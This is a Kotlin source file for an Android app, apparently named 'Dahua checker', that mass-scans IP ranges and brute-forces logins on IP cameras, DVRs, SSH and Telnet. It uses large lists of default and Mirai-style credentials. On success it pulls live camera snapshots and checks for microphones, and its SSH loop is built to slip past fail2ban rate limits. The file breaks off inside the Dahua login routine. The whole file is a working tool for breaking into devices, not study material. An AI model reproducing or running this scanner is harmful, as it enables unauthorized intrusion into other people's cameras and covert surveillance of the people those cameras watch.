package com.dahua.checker

import android.util.Base64
import kotlinx.coroutines.*
import kotlinx.coroutines.sync.Semaphore
import kotlinx.coroutines.sync.withPermit
import java.io.ByteArrayOutputStream
import java.io.InputStream
import java.io.OutputStream
import java.net.HttpURLConnection
import java.net.InetSocketAddress
import java.net.Socket
import java.net.URL
import java.util.concurrent.atomic.AtomicInteger
import net.schmizz.sshj.SSHClient
import net.schmizz.sshj.transport.verification.PromiscuousVerifier
import java.util.concurrent.TimeUnit

data class ScanResult(
    val ip: String,
    val port: Int,
    val login: String,
    val password: String,
    val model: String,
    val channels: Int,
    val snapshot: ByteArray?,
    val blocked: Boolean = false,
    val brand: String = "Dahua",
    val hasMic: Boolean = false,
    val timestampMs: Long = System.currentTimeMillis(),
    val metadata: Map<String, String> = emptyMap()
)

data class ScanProgress(
    val total: Int,
    val checked: Int,
    val successful: Int,
    val blocked: Int,
    val elapsedMs: Long,
    val finished: Boolean = false,
    val cancelled: Boolean = false
)

class DahuaScanner {

    companion object {
        const val DEFAULT_PORT = 37777
        const val TIMEOUT_CONNECT = 1500
        const val TIMEOUT_READ = 3000
        const val TIMEOUT_SNAPSHOT = 2500
        const val TIMEOUT_HTTP = 3000
        const val MAX_CONCURRENT = 200
        const val SSH_MAX_CONCURRENT = 50  // SSH/Telnet нельзя так агрессивно — fail2ban

        val CAMERA_PORTS = listOf(37777, 80, 8080, 554, 34567, 8000, 8899, 22, 23)

        val SSH_CREDENTIALS = listOf(
            "root" to "root",
            "root" to "",
            "root" to "admin",
            "root" to "123456",
            "root" to "password",
            "root" to "1234",
            "root" to "12345",
            "root" to "toor",
            "root" to "pass",
            "root" to "vizxv",
            "root" to "xc3511",
            "root" to "xmhdipc",
            "root" to "juantech",
            "root" to "dreambox",
            "root" to "realtek",
            "root" to "default",
            "root" to "7ujMko0admin",
            "root" to "54321",
            "root" to "ikwb",
            "root" to "anko",
            "root" to "system",
            "admin" to "admin",
            "admin" to "123456",
            "admin" to "",
            "admin" to "password",
            "admin" to "1234",
            "ubnt" to "ubnt",
            "service" to "service",
            "support" to "support",
            "user" to "user",
            "pi" to "raspberry",
            "pi" to "raspberryraspberry993311"
        )

        val CREDENTIALS = listOf(
            "admin" to "admin",
            "admin" to "123456",
            "admin" to "",
            "admin" to "admin123",
            "admin" to "12345",
            "admin" to "1234",
            "admin" to "password",
            "admin" to "1111",
            "admin" to "111111",
            "admin" to "000000",
            "admin" to "1234567890",
            "admin" to "admin888",
            "admin" to "admin666",
            "666666" to "666666",
            "888888" to "888888",
            "default" to "tluafed",
            "user" to "user",
            "root" to "root",
            "root" to "admin",
            "root" to "123456",
            "root" to "",
            "guest" to "guest",
            "admin" to "7ujMko0admin",
            "admin" to "system",
            "admin" to "pass",
            "admin" to "camera",
            "admin" to "abc123",
            "admin" to "admin1",
            "admin" to "meinsm",
            "admin" to "fliradmin",
            "admin" to "123",
            "admin" to "4321",
            "admin" to "54321",
            "admin" to "888888",
            "admin" to "666666",
            "admin" to "qwerty",
            "admin" to "service",
            "admin" to "supervisor",
            "admin" to "support",
            "admin" to "tech",
            "admin" to "pass1234",
            "admin" to "macintosh",
            "admin" to "default",
            "admin" to "video",
            "admin" to "vizxv",
            "admin" to "hik12345",
            "admin" to "Hikvision",
            "admin" to "hikvision",
            "admin" to "HikHik",
            "admin" to "a]qwe1~!",
            "root" to "pass",
            "root" to "system",
            "root" to "password",
            "root" to "1234",
            "root" to "12345",
            "root" to "vizxv",
            "root" to "anko",
            "root" to "xc3511",
            "root" to "dreambox",
            "root" to "xmhdipc",
            "root" to "juantech",
            "root" to "54321",
            "root" to "ikwb",
            "root" to "realtek",
            "root" to "default",
            "root" to "7ujMko0admin",
            "service" to "service",
            "supervisor" to "supervisor",
            "ubnt" to "ubnt",
            "support" to "support",
            "operator" to "operator"
        )

        // HTTP-пароли (больше — для полной проверки)
        val HTTP_CREDENTIALS = listOf(
            "admin" to "admin",
            "admin" to "123456",
            "admin" to "",
            "admin" to "12345",
            "admin" to "admin123",
            "admin" to "1234",
            "admin" to "password",
            "admin" to "1111",
            "admin" to "111111",
            "admin" to "000000",
            "admin" to "1234567890",
            "admin" to "888888",
            "admin" to "666666",
            "admin" to "admin888",
            "admin" to "admin666",
            "admin" to "qwerty",
            "admin" to "hik12345",
            "admin" to "Hikvision",
            "admin" to "hikvision",
            "admin" to "HikHik",
            "admin" to "camera",
            "admin" to "system",
            "admin" to "service",
            "admin" to "supervisor",
            "admin" to "video",
            "admin" to "vizxv",
            "admin" to "7ujMko0admin",
            "admin" to "meinsm",
            "admin" to "fliradmin",
            "admin" to "a]qwe1~!",
            "666666" to "666666",
            "888888" to "888888",
            "root" to "root",
            "root" to "",
            "root" to "admin",
            "root" to "123456",
            "root" to "pass",
            "root" to "vizxv",
            "root" to "xc3511",
            "root" to "xmhdipc",
            "root" to "juantech",
            "root" to "7ujMko0admin",
            "guest" to "guest",
            "default" to "tluafed",
            "service" to "service",
            "supervisor" to "supervisor",
            "ubnt" to "ubnt",
            "support" to "support"
        )
    }

    @Volatile
    var cancelled = false

    private val semaphore = Semaphore(MAX_CONCURRENT)
    private val checkedCount = AtomicInteger(0)
    private val successCount = AtomicInteger(0)
    private val blockedCount = AtomicInteger(0)

    /**
     * Стандартное сканирование на конкретном порту (Dahua binary protocol)
     */
    suspend fun scan(
        ips: List<String>,
        port: Int = DEFAULT_PORT,
        onResult: suspend (ScanResult) -> Unit,
        onProgress: suspend (ScanProgress) -> Unit
    ) {
        cancelled = false
        checkedCount.set(0)
        successCount.set(0)
        blockedCount.set(0)
        val total = ips.size
        val startTime = System.currentTimeMillis()

        coroutineScope {
            val progressJob = launch(Dispatchers.Default) {
                while (isActive && !cancelled && checkedCount.get() < total) {
                    delay(200)
                    val elapsed = System.currentTimeMillis() - startTime
                    onProgress(ScanProgress(total, checkedCount.get(), successCount.get(), blockedCount.get(), elapsed))
                }
            }

            ips.map { ip ->
                async(Dispatchers.IO) {
                    if (cancelled) {
                        checkedCount.incrementAndGet()
                        return@async
                    }
                    semaphore.withPermit {
                        if (cancelled) {
                            checkedCount.incrementAndGet()
                            return@withPermit
                        }
                        try {
                            val result = tryCredentials(ip, port)
                            if (result != null) {
                                if (result.blocked) blockedCount.incrementAndGet()
                                else successCount.incrementAndGet()
                                onResult(result)
                            }
                        } catch (_: Exception) {}
                        checkedCount.incrementAndGet()
                    }
                }
            }.awaitAll()

            progressJob.cancel()
        }
        val elapsed = System.currentTimeMillis() - startTime
        onProgress(ScanProgress(total, checkedCount.get(), successCount.get(), blockedCount.get(), elapsed,
            finished = !cancelled, cancelled = cancelled))
    }

    /**
     * Мультипортовое сканирование — проверяет все порты камер.
     * Сначала Dahua binary (37777), потом HTTP (80, 8080, 8000, 8899), потом RTSP (554), XMeye (34567).
     */
    suspend fun scanMultiPort(
        ips: List<String>,
        onResult: suspend (ScanResult) -> Unit,
        onProgress: suspend (ScanProgress) -> Unit
    ) {
        cancelled = false
        checkedCount.set(0)
        successCount.set(0)
        blockedCount.set(0)
        val total = ips.size
        val startTime = System.currentTimeMillis()

        coroutineScope {
            val progressJob = launch(Dispatchers.Default) {
                while (isActive && !cancelled && checkedCount.get() < total) {
                    delay(200)
                    val elapsed = System.currentTimeMillis() - startTime
                    onProgress(ScanProgress(total, checkedCount.get(), successCount.get(), blockedCount.get(), elapsed))
                }
            }

            ips.map { ip ->
                async(Dispatchers.IO) {
                    if (cancelled) {
                        checkedCount.incrementAndGet()
                        return@async
                    }
                    semaphore.withPermit {
                        if (cancelled) {
                            checkedCount.incrementAndGet()
                            return@withPermit
                        }
                        try {
                            val result = scanAllPorts(ip)
                            if (result != null) {
                                if (result.blocked) blockedCount.incrementAndGet()
                                else successCount.incrementAndGet()
                                onResult(result)
                            }
                        } catch (_: Exception) {}
                        checkedCount.incrementAndGet()
                    }
                }
            }.awaitAll()

            progressJob.cancel()
        }
        val elapsed = System.currentTimeMillis() - startTime
        onProgress(ScanProgress(total, checkedCount.get(), successCount.get(), blockedCount.get(), elapsed,
            finished = !cancelled, cancelled = cancelled))
    }

    private fun scanAllPorts(ip: String): ScanResult? {
        return scanSelectedPortsInternal(ip, CAMERA_PORTS)
    }

    private fun scanSelectedPortsInternal(ip: String, ports: List<Int>): ScanResult? {
        try {
            // 1. Dahua binary protocol (37777)
            if (37777 in ports && !cancelled) {
                val dahua = tryCredentials(ip, 37777)
                if (dahua != null) return dahua
            }

            // 2. HTTP-порты (80, 8080, 8000, 8899) — Hikvision/Dahua/Generic web UI
            val httpPorts = listOf(80, 8080, 8000, 8899).filter { it in ports }
            for (port in httpPorts) {
                if (cancelled) return null
                val http = tryHttpCamera(ip, port)
                if (http != null) return http
            }

            // 3. XMeye binary protocol (34567)
            if (34567 in ports && !cancelled) {
                val xmeye = tryXMeye(ip)
                if (xmeye != null) return xmeye
            }

            // 4. SSH (22)
            if (22 in ports && !cancelled) {
                val ssh = trySsh(ip)
                if (ssh != null) return ssh
            }

            // 5. Telnet (23) — всегда отдельно если выбран
            if (23 in ports && !cancelled) {
                val telnet = tryTelnet(ip)
                if (telnet != null) return telnet
            }
        } catch (_: Exception) {}

        return null
    }

    /**
     * Сканирование с выбранными портами
     */
    suspend fun scanSelectedPorts(
        ips: List<String>,
        selectedPorts: List<Int>,
        onResult: suspend (ScanResult) -> Unit,
        onProgress: suspend (ScanProgress) -> Unit
    ) {
        cancelled = false
        checkedCount.set(0)
        successCount.set(0)
        blockedCount.set(0)
        val total = ips.size
        val startTime = System.currentTimeMillis()

        coroutineScope {
            val progressJob = launch(Dispatchers.Default) {
                while (isActive && !cancelled && checkedCount.get() < total) {
                    delay(200)
                    val elapsed = System.currentTimeMillis() - startTime
                    onProgress(ScanProgress(total, checkedCount.get(), successCount.get(), blockedCount.get(), elapsed))
                }
            }

            ips.map { ip ->
                async(Dispatchers.IO) {
                    if (cancelled) {
                        checkedCount.incrementAndGet()
                        return@async
                    }
                    semaphore.withPermit {
                        if (cancelled) {
                            checkedCount.incrementAndGet()
                            return@withPermit
                        }
                        try {
                            val result = scanSelectedPortsInternal(ip, selectedPorts)
                            if (result != null) {
                                if (result.blocked) blockedCount.incrementAndGet()
                                else successCount.incrementAndGet()
                                onResult(result)
                            }
                        } catch (_: Exception) {}
                        checkedCount.incrementAndGet()
                    }
                }
            }.awaitAll()

            progressJob.cancel()
        }
        val elapsed = System.currentTimeMillis() - startTime
        onProgress(ScanProgress(total, checkedCount.get(), successCount.get(), blockedCount.get(), elapsed,
            finished = !cancelled, cancelled = cancelled))
    }

    // ─── HTTP Camera Check (Hikvision/Dahua/Generic) ───

    private fun tryHttpCamera(ip: String, port: Int): ScanResult? {
        // Быстрая проверка порта
        try {
            Socket().use { probe ->
                probe.connect(InetSocketAddress(ip, port), TIMEOUT_CONNECT)
            }
        } catch (_: Exception) {
            return null
        }

        // Определяем бренд
        val brand = detectBrand(ip, port)

        for ((login, password) in HTTP_CREDENTIALS) {
            if (cancelled) return null
            try {
                val authResult = when (brand) {
                    "Hikvision" -> tryHikvisionAuth(ip, port, login, password)
                    "Dahua" -> tryDahuaHttpAuth(ip, port, login, password)
                    else -> tryBasicAuth(ip, port, login, password)
                }
                if (authResult != null) return authResult
            } catch (_: Exception) {
                continue
            }
        }
        return null
    }

    private fun detectBrand(ip: String, port: Int): String {
        try {
            val url = URL("http://$ip:$port/")
            val conn = url.openConnection() as HttpURLConnection
            conn.connectTimeout = TIMEOUT_CONNECT
            conn.readTimeout = TIMEOUT_HTTP
            conn.instanceFollowRedirects = false
            conn.requestMethod = "GET"
            try {
                conn.connect()
                val responseCode = conn.responseCode
                val headers = conn.headerFields
                val server = conn.getHeaderField("Server") ?: ""
                val wwwAuth = conn.getHeaderField("WWW-Authenticate") ?: ""
                val body = try {
                    conn.inputStream.bufferedReader().use { it.readText().take(2000) }
                } catch (_: Exception) {
                    try {
                        conn.errorStream?.bufferedReader()?.use { it.readText().take(2000) } ?: ""
                    } catch (_: Exception) { "" }
                }

                val combined = (server + wwwAuth + body).lowercase()
                return when {
                    "hikvision" in combined || "hikdigital" in combined || "webcomponents" in combined -> "Hikvision"
                    "dahua" in combined || "dh-" in combined || "dhweb" in combined -> "Dahua"
                    "dvrdvs" in combined || "xmeye" in combined || "juan" in combined -> "XMeye"
                    "foscam" in combined -> "Foscam"
                    "axis" in combined -> "Axis"
                    "ipc" in combined || "nvr" in combined || "camera" in combined -> "Generic"
                    responseCode == 401 -> "Generic"
                    else -> "Unknown"
                }
            } finally {
                conn.disconnect()
            }
        } catch (_: Exception) {
            return "Unknown"
        }
    }

    private fun tryHikvisionAuth(ip: String, port: Int, login: String, password: String): ScanResult? {
        // Hikvision ISAPI Digest/Basic auth check
        val url = URL("http://$ip:$port/ISAPI/System/deviceInfo")
        val conn = url.openConnection() as HttpURLConnection
        conn.connectTimeout = TIMEOUT_CONNECT
        conn.readTimeout = TIMEOUT_HTTP
        conn.requestMethod = "GET"
        val auth = Base64.encodeToString("$login:$password".toByteArray(), Base64.NO_WRAP)
        conn.setRequestProperty("Authorization", "Basic $auth")
        try {
            conn.connect()
            val code = conn.responseCode
            if (code == 200) {
                val body = conn.inputStream.bufferedReader().use { it.readText().take(4000) }
                val model = extractXmlField(body, "model") ?: extractXmlField(body, "deviceName") ?: "Hikvision"
                val channels = extractXmlField(body, "channelNum")?.toIntOrNull() ?: 1

                val snapshot = getHikvisionSnapshot(ip, port, login, password)
                val mic = checkMicHikvision(ip, port, login, password)
                conn.disconnect()
                return ScanResult(ip, port, login, password, model, channels, snapshot, brand = "Hikvision", hasMic = mic)
            }
            conn.disconnect()
        } catch (_: Exception) {
            conn.disconnect()
        }
        return null
    }

    private fun getHikvisionSnapshot(ip: String, port: Int, login: String, password: String): ByteArray? {
        val paths = listOf(
            "/ISAPI/Streaming/channels/101/picture",
            "/ISAPI/Streaming/channels/1/picture",
            "/Streaming/channels/1/picture",
            "/cgi-bin/snapshot.cgi"
        )
        val auth = Base64.encodeToString("$login:$password".toByteArray(), Base64.NO_WRAP)
        for (path in paths) {
            try {
                val url = URL("http://$ip:$port$path")
                val conn = url.openConnection() as HttpURLConnection
                conn.connectTimeout = TIMEOUT_CONNECT
                conn.readTimeout = TIMEOUT_SNAPSHOT
                conn.requestMethod = "GET"
                conn.setRequestProperty("Authorization", "Basic $auth")
                conn.connect()
                if (conn.responseCode == 200) {
                    val contentType = conn.contentType ?: ""
                    if ("image" in contentType || conn.contentLength > 1000) {
                        val data = conn.inputStream.readBytes()
                        conn.disconnect()
                        if (data.size > 100) return data
                    }
                }
                conn.disconnect()
            } catch (_: Exception) {}
        }
        return null
    }

    private fun tryDahuaHttpAuth(ip: String, port: Int, login: String, password: String): ScanResult? {
        // Dahua HTTP CGI auth
        val url = URL("http://$ip:$port/cgi-bin/magicBox.cgi?action=getDeviceType")
        val conn = url.openConnection() as HttpURLConnection
        conn.connectTimeout = TIMEOUT_CONNECT
        conn.readTimeout = TIMEOUT_HTTP
        conn.requestMethod = "GET"
        val auth = Base64.encodeToString("$login:$password".toByteArray(), Base64.NO_WRAP)
        conn.setRequestProperty("Authorization", "Basic $auth")
        try {
            conn.connect()
            if (conn.responseCode == 200) {
                val body = conn.inputStream.bufferedReader().use { it.readText().take(2000) }
                val model = if ("type=" in body) body.substringAfter("type=").trim() else "Dahua"
                val snapshot = getDahuaHttpSnapshot(ip, port, login, password)
                val mic = checkMicDahuaHttp(ip, port, login, password)
                conn.disconnect()
                return ScanResult(ip, port, login, password, model, 1, snapshot, brand = "Dahua-HTTP", hasMic = mic)
            }
            conn.disconnect()
        } catch (_: Exception) {
            conn.disconnect()
        }
        return null
    }

    private fun getDahuaHttpSnapshot(ip: String, port: Int, login: String, password: String): ByteArray? {
        val paths = listOf(
            "/cgi-bin/snapshot.cgi?channel=0",
            "/cgi-bin/snapshot.cgi",
            "/snapshot.jpg"
        )
        val auth = Base64.encodeToString("$login:$password".toByteArray(), Base64.NO_WRAP)
        for (path in paths) {
            try {
                val url = URL("http://$ip:$port$path")
                val conn = url.openConnection() as HttpURLConnection
                conn.connectTimeout = TIMEOUT_CONNECT
                conn.readTimeout = TIMEOUT_SNAPSHOT
                conn.requestMethod = "GET"
                conn.setRequestProperty("Authorization", "Basic $auth")
                conn.connect()
                if (conn.responseCode == 200) {
                    val data = conn.inputStream.readBytes()
                    conn.disconnect()
                    if (data.size > 100) return data
                }
                conn.disconnect()
            } catch (_: Exception) {}
        }
        return null
    }

    private fun tryBasicAuth(ip: String, port: Int, login: String, password: String): ScanResult? {
        // Generic Basic Auth — /cgi-bin/snapshot, /snap.jpg, или просто 200 на /
        val auth = Base64.encodeToString("$login:$password".toByteArray(), Base64.NO_WRAP)

        // Попробуем получить доступ
        val checkPaths = listOf(
            "/cgi-bin/snapshot.cgi",
            "/snap.jpg",
            "/image/jpeg.cgi",
            "/snapshot.jpg",
            "/cgi-bin/hi3510/snap.cgi"
        )

        for (path in checkPaths) {
            if (cancelled) return null
            try {
                val url = URL("http://$ip:$port$path")
                val conn = url.openConnection() as HttpURLConnection
                conn.connectTimeout = TIMEOUT_CONNECT
                conn.readTimeout = TIMEOUT_SNAPSHOT
                conn.requestMethod = "GET"
                conn.setRequestProperty("Authorization", "Basic $auth")
                conn.connect()
                if (conn.responseCode == 200) {
                    val data = conn.inputStream.readBytes()
                    conn.disconnect()
                    if (data.size > 100) {
                        val mic = checkMicGeneric(ip, port, login, password)
                        return ScanResult(ip, port, login, password, "Generic", 1, data, brand = "HTTP", hasMic = mic)
                    }
                }
                conn.disconnect()
            } catch (_: Exception) {}
        }
        return null
    }

    // ─── XMeye binary protocol (34567) ───

    private fun tryXMeye(ip: String): ScanResult? {
        try {
            Socket().use { probe ->
                probe.connect(InetSocketAddress(ip, 34567), TIMEOUT_CONNECT)
            }
        } catch (_: Exception) {
            return null
        }

        val simpleCredentials = listOf(
            "admin" to "",
            "admin" to "admin",
            "admin" to "123456",
            "default" to "tluafed"
        )

        for ((login, password) in simpleCredentials) {
            if (cancelled) return null
            try {
                val socket = Socket()
                socket.connect(InetSocketAddress(ip, 34567), TIMEOUT_CONNECT)
                socket.soTimeout = TIMEOUT_READ

                val passHash = xmeyeHashPassword(password)
                val loginJson = """{"EncryptType":"MD5","LoginType":"DVRIP-Web","PassWord":"$passHash","UserName":"$login"}"""
                val packet = buildXMeyePacket(0x03e8, loginJson)

                socket.getOutputStream().write(packet)
                socket.getOutputStream().flush()

                val header = ByteArray(20)
                var read = 0
                val deadline = System.currentTimeMillis() + TIMEOUT_READ
                while (read < 20 && System.currentTimeMillis() < deadline) {
                    val r = socket.getInputStream().read(header, read, 20 - read)
                    if (r == -1) break
                    read += r
                }

                if (read >= 20) {
                    val dataLen = ((header[15].toInt() and 0xFF) shl 8) or (header[14].toInt() and 0xFF)
                    if (dataLen in 1..8192) {
                        val data = ByteArray(dataLen)
                        var dRead = 0
                        while (dRead < dataLen && System.currentTimeMillis() < deadline) {
                            val r = socket.getInputStream().read(data, dRead, dataLen - dRead)
                            if (r == -1) break
                            dRead += r
                        }
                        val response = String(data, 0, dRead, Charsets.UTF_8)
                        if ("\"Ret\" : 100" in response || "\"SessionID\"" in response) {
                            socket.close()
                            return ScanResult(ip, 34567, login, password, "XMeye/DVR", 1, null, brand = "XMeye")
                        }
                    }
                }
                socket.close()
            } catch (_: Exception) {}
        }
        return null
    }

    private fun xmeyeHashPassword(password: String): String {
        if (password.isEmpty()) return ""
        val md5 = java.security.MessageDigest.getInstance("MD5")
        val hash = md5.digest(password.toByteArray(Charsets.UTF_8))
        val sb = StringBuilder()
        for (i in hash.indices step 2) {
            val sum = (hash[i].toInt() and 0xFF) + (if (i + 1 < hash.size) hash[i + 1].toInt() and 0xFF else 0)
            sb.append((sum % 62).let { v ->
                when {
                    v < 10 -> ('0' + v)
                    v < 36 -> ('A' + v - 10)
                    else -> ('a' + v - 36)
                }
            })
        }
        return sb.toString()
    }

    private fun buildXMeyePacket(msgId: Int, json: String): ByteArray {
        val data = (json + "\n").toByteArray(Charsets.UTF_8)
        val header = ByteArray(20)
        header[0] = 0xFF.toByte()
        header[1] = 0x01
        header[8] = (msgId and 0xFF).toByte()
        header[9] = ((msgId shr 8) and 0xFF).toByte()
        header[14] = (data.size and 0xFF).toByte()
        header[15] = ((data.size shr 8) and 0xFF).toByte()
        return header + data
    }

    // ─── SSH баннер + Telnet брутфорс ───

    private fun trySsh(ip: String): ScanResult? {
        // 1) Читаем SSH баннер (быстрый probe)
        var sshBanner = ""
        try {
            Socket().use { s ->
                s.connect(InetSocketAddress(ip, 22), TIMEOUT_CONNECT)
                s.soTimeout = 3000
                val buf = ByteArray(256)
                val n = s.getInputStream().read(buf)
                if (n > 0) sshBanner = String(buf, 0, n, Charsets.UTF_8).trim()
            }
        } catch (_: Exception) {}

        // 2) SSH открыт — брутфорсим через SSHJ
        if (sshBanner.startsWith("SSH-")) {
            var consecutiveFails = 0
            var delayMs = 200L

            for ((login, password) in SSH_CREDENTIALS) {
                if (cancelled) return null

                // Антибан: задержка между попытками, растёт после ошибок подключения
                if (consecutiveFails > 0) {
                    try { Thread.sleep(delayMs) } catch (_: InterruptedException) { return null }
                }

                // Если 6+ подряд connection refused — сервер забанил, стоп
                if (consecutiveFails >= 6) {
                    return ScanResult(ip, 22, "—", "—", sshBanner.take(50) + " [rate-limited]", 0, null, brand = "SSH")
                }

                try {
                    val ssh = SSHClient()
                    ssh.addHostKeyVerifier(PromiscuousVerifier())
                    ssh.connectTimeout = TIMEOUT_CONNECT
                    ssh.timeout = 5000
                    ssh.connect(ip, 22)
                    try {
                        ssh.authPassword(login, password)
                        if (ssh.isAuthenticated) {
                            val info = sshBanner.take(60)
                            try { ssh.disconnect() } catch (_: Exception) {}
                            return ScanResult(ip, 22, login, password, info, 0, null, brand = "SSH")
                        }
                        // Неверный пароль — нормальная ситуация, сброс счётчика
                        consecutiveFails = 0
                        delayMs = 200L
                    } catch (_: Exception) {
                        // Auth exception — тоже нормально
                        consecutiveFails = 0
                    } finally {
                        try { ssh.disconnect() } catch (_: Exception) {}
                    }
                } catch (_: Exception) {
                    // Connection refused / timeout — возможно fail2ban
                    consecutiveFails++
                    delayMs = (delayMs * 2).coerceAtMost(3000L)
                }
            }
            // SSH открыт но ни один пароль не подошёл
            return ScanResult(ip, 22, "—", "—", sshBanner.take(60) + " [blocked]", 0, null, brand = "SSH")
        }

        // SSH не открыт — НЕ фоллбэк на telnet (telnet проверяется отдельно по порту 23)
        return null
    }

    private fun tryTelnet(ip: String): ScanResult? {
        // Проверяем что порт 23 открыт
        try {
            Socket().use { probe ->
                probe.connect(InetSocketAddress(ip, 23), TIMEOUT_CONNECT)
            }
        } catch (_: Exception) {
            return null
        }

        // Telnet открыт — пробуем пароли
        for ((login, password) in SSH_CREDENTIALS) {
            if (cancelled) return null
            try {
                val socket = Socket()
                socket.connect(InetSocketAddress(ip, 23), TIMEOUT_CONNECT)
                socket.soTimeout = 4000
                val input = socket.getInputStream()
                val output = socket.getOutputStream()

                // Читаем приветствие / промпт логина (soTimeout уже стоит — read блокирует до данных)
                val welcomeBuf = ByteArray(2048)
                val wn = try { input.read(welcomeBuf) } catch (_: Exception) { 0 }

                // Отправляем логин
                output.write("$login\r\n".toByteArray())
                output.flush()
                try { Thread.sleep(500) } catch (_: InterruptedException) { socket.close(); return null }

                // Читаем ответ (ожидаем запрос пароля)
                val loginBuf = ByteArray(2048)
                val ln = try { input.read(loginBuf) } catch (_: Exception) { 0 }

                // Отправляем пароль
                output.write("$password\r\n".toByteArray())
                output.flush()
                try { Thread.sleep(600) } catch (_: InterruptedException) { socket.close(); return null }

                // Читаем результат
                val passBuf = ByteArray(4096)
                val pn = try { input.read(passBuf) } catch (_: Exception) { 0 }
                val passResp = if (pn > 0) String(passBuf, 0, pn, Charsets.UTF_8).lowercase() else ""

                socket.close()

                // Проверяем успешность входа
                val failIndicators = listOf("login incorrect", "login failed", "authentication fail",
                    "bad password", "access denied", "invalid", "error", "wrong")
                val successIndicators = listOf("#", "$", ">", "busybox", "welcome", "shell",
                    "dvr", "nvr", "camera", "root@", "admin@")

                val isFail = failIndicators.any { it in passResp }
                val isSuccess = successIndicators.any { it in passResp }

                if (isSuccess && !isFail) {
                    val model = when {
                        "busybox" in passResp -> "BusyBox/Linux"
                        "dvr" in passResp -> "DVR"
                        "nvr" in passResp -> "NVR"
                        else -> "Telnet"
                    }
                    return ScanResult(ip, 23, login, password, model, 0, null, brand = "Telnet")
                }
            } catch (_: Exception) {
                continue
            }
        }
        return null
    }

    // ─── Проверка микрофона ───

    private fun checkMicHikvision(ip: String, port: Int, login: String, password: String): Boolean {
        val paths = listOf(
            "/ISAPI/System/Audio/channels",
            "/ISAPI/System/TwoWayAudio/channels"
        )
        val auth = Base64.encodeToString("$login:$password".toByteArray(), Base64.NO_WRAP)
        for (path in paths) {
            try {
                val url = URL("http://$ip:$port$path")
                val conn = url.openConnection() as HttpURLConnection
                conn.connectTimeout = 1500
                conn.readTimeout = 2000
                conn.requestMethod = "GET"
                conn.setRequestProperty("Authorization", "Basic $auth")
                conn.connect()
                if (conn.responseCode == 200) {
                    val body = conn.inputStream.bufferedReader().use { it.readText().take(4000) }
                    conn.disconnect()
                    if ("audioIn" in body.lowercase() || "microphonevolume" in body.lowercase() ||
                        "enabled>true" in body.lowercase() || "audioinput" in body.lowercase() ||
                        "AudioChannel" in body) {
                        return true
                    }
                }
                conn.disconnect()
            } catch (_: Exception) {}
        }
        return false
    }

    private fun checkMicDahuaHttp(ip: String, port: Int, login: String, password: String): Boolean {
        val paths = listOf(
            "/cgi-bin/configManager.cgi?action=getConfig&name=Encode",
            "/cgi-bin/configManager.cgi?action=getConfig&name=General"
        )
        val auth = Base64.encodeToString("$login:$password".toByteArray(), Base64.NO_WRAP)
        for (path in paths) {
            try {
                val url = URL("http://$ip:$port$path")
                val conn = url.openConnection() as HttpURLConnection
                conn.connectTimeout = 1500
                conn.readTimeout = 2000
                conn.requestMethod = "GET"
                conn.setRequestProperty("Authorization", "Basic $auth")
                conn.connect()
                if (conn.responseCode == 200) {
                    val body = conn.inputStream.bufferedReader().use { it.readText().take(8000) }
                    conn.disconnect()
                    if ("AudioEnable=true" in body || "Audio.Enable=true" in body ||
                        "audio_enable=1" in body || ".Audio=" in body) {
                        return true
                    }
                }
                conn.disconnect()
            } catch (_: Exception) {}
        }
        return false
    }

    private fun checkMicGeneric(ip: String, port: Int, login: String, password: String): Boolean {
        // Пробуем RTSP OPTIONS на 554 — если есть аудио трек
        try {
            val url = URL("http://$ip:$port/cgi-bin/configManager.cgi?action=getConfig&name=Encode")
            val conn = url.openConnection() as HttpURLConnection
            conn.connectTimeout = 1500
            conn.readTimeout = 2000
            val auth = Base64.encodeToString("$login:$password".toByteArray(), Base64.NO_WRAP)
            conn.setRequestProperty("Authorization", "Basic $auth")
            conn.connect()
            if (conn.responseCode == 200) {
                val body = conn.inputStream.bufferedReader().use { it.readText().take(8000) }
                conn.disconnect()
                if ("audio" in body.lowercase() && ("enable" in body.lowercase() || "true" in body.lowercase())) {
                    return true
                }
            }
            conn.disconnect()
        } catch (_: Exception) {}
        return false
    }

    // ─── Dahua binary protocol (37777) ───

    private fun tryCredentials(ip: String, port: Int): ScanResult? {
        try {
            Socket().use { probe ->
                probe.connect(InetSocketAddress(ip, port), TIMEOUT_CONNECT)
            }
        } catch (_: Exception) {
            return null
        }

        for ((login, password) in CREDENTIALS) {
            if (cancelled) return null
            var socket: Socket? = null
            try {
                socket = Socket()
                socket.tcpNoDelay = true
                socket.setSoLinger(true, 0)
                socket.connect(InetSocketAddress(ip, port), TIMEOUT_CONNECT)
                socket.soTimeout = TIMEOUT_READ

                val output = socket.getOutputStream()
                val input = socket.getInputStream()
                val authStatus = sendLogin(output, input, login, password)

                if (authStatus == AuthStatus.BLOCKED) {
                    socket.close()
                    return ScanResult(ip, port, login, password, "", 0, null, blocked = true, brand = "Dahua")
                }

                if (authStatus != AuthStatus.SUCCESS) {
                    socket.close()
                    continue
                }

                val model = try { getModel(output, input) } catch (_: Exception) { "unknown" }
                val channels = try { getChannelsCount(output, input) } catch (_: Exception) { 1 }

                for (ch in 0 until minOf(channels, 4)) {
                    try {
                        socket.soTimeout = TIMEOUT_SNAPSHOT
                        val photo = getSnapshot(output, input, ch)
                        socket.soTimeout = TIMEOUT_READ
                        if (photo != null && photo.size > 100) {
                            try { socket.close() } catch (_: Exception) {}
                            val mic = checkMicDahuaHttp(ip, 80, login, password)
                            return ScanResult(ip, port, login, password, model, channels, photo, brand = "Dahua", hasMic = mic)
                        }
                    } catch (_: Exception) {}
                }

                try { socket.close() } catch (_: Exception) {}
                val mic = checkMicDahuaHttp(ip, 80, login, password)
                return ScanResult(ip, port, login, password, model, channels, null, brand = "Dahua", hasMic = mic)

            } catch (_: Exception) {
                try { socket?.close() } catch (_: Exception) {}
                if (login == CREDENTIALS.first().first && password == CREDENTIALS.first().second) return null
                continue
            }
        }
        return null
    }

    private enum class AuthStatus { SUCCESS, BLOCKED, FAIL }

    private fun sendLogin(output: OutputStream, input: InputStream, login: String, password: String): AuthStatus {
        val loginAscii = login.toByteArray(Charsets.US_ASCII)
        val passAscii = password.toByteArray(Charsets.US_ASCII)
        val loginPadded = ByteArray(8)
        loginAscii.copyInto(loginPadded, 0, 0, minOf(loginAscii.size, 8))
        val passPadded = ByteArray(8)
        passAscii.copyInto(passPadded, 0, 0, minOf(passAscii.size, 8))
        val totalLen = 24 + loginAscii.size + passAscii.size
        if (totalLen > 127) return AuthStatus.FAIL
        val timestamp = (System.currentTimeMillis() / 1000).toString().toByteArray(Charsets.US_ASCII)

        val packet = ByteArrayOutputStream(64)
